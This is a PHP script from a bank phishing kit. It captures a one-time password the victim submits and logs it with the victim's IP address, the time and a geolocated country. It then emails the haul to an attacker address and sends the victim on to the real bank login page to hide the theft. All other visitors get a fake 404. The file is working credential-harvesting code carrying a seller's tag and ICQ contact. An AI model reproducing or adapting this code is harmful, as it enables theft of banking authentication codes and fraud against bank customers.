

<?php
ob_start();
session_start();

$url = json_decode(file_get_contents("http://api.ipinfodb.com/v3/ip-city/?key=2b3d7d0ad1a285279139487ce77f3f58d980eea9546b5ccc5d08f5ee62ce7471&ip=".$_SERVER['REMOTE_ADDR']."&format=json"));
$country=$url->countryName;
$state=$url->regionName;


require "email.php";



if(isset($_POST['otp'])&&isset($_POST['p'])){


	$hi="#---------------------------[ FIXSWEB_FTB]----------------------------#\r\n";
	$hi.="OTP3: {$_POST['otp']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="IP		:  {$_SERVER['REMOTE_ADDR']}\r\n";
	$hi.="#---------------------------[ FIXSWEB_ICQ..@715490015]----------------------------#\r\n";

		$save=fopen("logs.txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#FBBANK From  [ {$country}]";
	$headers="From: FBANK FIXSWEB <fixsweb>  \r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	@mail($your_email,$subject,$hi,$headers);
	
	

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
                include('html/bootstrap3/js/blocker.txt');
                exit(header("Location: https://ftbbank.com/km/")); // go to bank login page officiel..
        
    
            }else{
            
                header("HTTP/1.0 404 Not Found");
                exit();
            }
            
?>